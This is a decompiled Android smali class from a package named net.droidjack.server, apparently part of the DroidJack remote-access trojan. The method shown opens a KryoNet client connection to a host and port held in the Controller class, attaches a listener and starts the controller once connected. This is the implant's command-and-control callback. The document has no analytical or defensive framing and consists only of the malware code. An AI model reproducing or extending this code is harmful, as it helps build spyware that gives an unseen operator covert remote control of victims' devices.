.class Lnet/droidjack/server/w;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/util/concurrent/Callable;


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()Ljava/lang/Boolean;
    .locals 5

    const/4 v4, 0x0

    :try_start_0
    new-instance v0, Lcom/esotericsoftware/kryonet/Client;

    invoke-direct {v0}, Lcom/esotericsoftware/kryonet/Client;-><init>()V

    sput-object v0, Lnet/droidjack/server/Controller;->u:Lcom/esotericsoftware/kryonet/Client;

    sget-object v0, Lnet/droidjack/server/Controller;->u:Lcom/esotericsoftware/kryonet/Client;

    invoke-virtual {v0}, Lcom/esotericsoftware/kryonet/Client;->getKryo()Lcom/esotericsoftware/kryo/Kryo;

    move-result-object v0

    const-class v1, Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/esotericsoftware/kryo/Kryo;->register(Ljava/lang/Class;)Lcom/esotericsoftware/kryo/Registration;

    sget-object v0, Lnet/droidjack/server/Controller;->u:Lcom/esotericsoftware/kryonet/Client;

    const/16 v1, 0x7530

    invoke-virtual {v0, v1}, Lcom/esotericsoftware/kryonet/Client;->setTimeout(I)V

    sget-object v0, Lnet/droidjack/server/Controller;->u:Lcom/esotericsoftware/kryonet/Client;

    invoke-virtual {v0}, Lcom/esotericsoftware/kryonet/Client;->start()V

    sget-object v0, Lnet/droidjack/server/Controller;->u:Lcom/esotericsoftware/kryonet/Client;

    const/16 v1, 0x7530

    sget-object v2, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    invoke-static {v2}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v2

    sget v3, Lnet/droidjack/server/Controller;->z:I

    invoke-virtual {v0, v1, v2, v3}, Lcom/esotericsoftware/kryonet/Client;->connect(ILjava/net/InetAddress;I)V

    sget-object v0, Lnet/droidjack/server/Controller;->u:Lcom/esotericsoftware/kryonet/Client;

    new-instance v1, Lnet/droidjack/server/aa;

    const/4 v2, 0x0

    invoke-direct {v1, v2}, Lnet/droidjack/server/aa;-><init>(Lnet/droidjack/server/aa;)V

    invoke-virtual {v0, v1}, Lcom/esotericsoftware/kryonet/Client;->addListener(Lcom/esotericsoftware/kryonet/Listener;)V

    sget-object v0, Lnet/droidjack/server/Controller;->u:Lcom/esotericsoftware/kryonet/Client;

    invoke-virtual {v0}, Lcom/esotericsoftware/kryonet/Client;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-static {}, Lnet/droidjack/server/Controller;->a()V

    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    :goto_0
    return-object v0

    :cond_0
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_0
.end method

.method public synthetic call()Ljava/lang/Object;
    .locals 1

    invoke-virtual {p0}, Lnet/droidjack/server/w;->a()Ljava/lang/Boolean;

    move-result-object v0

    return-object v0
.end method
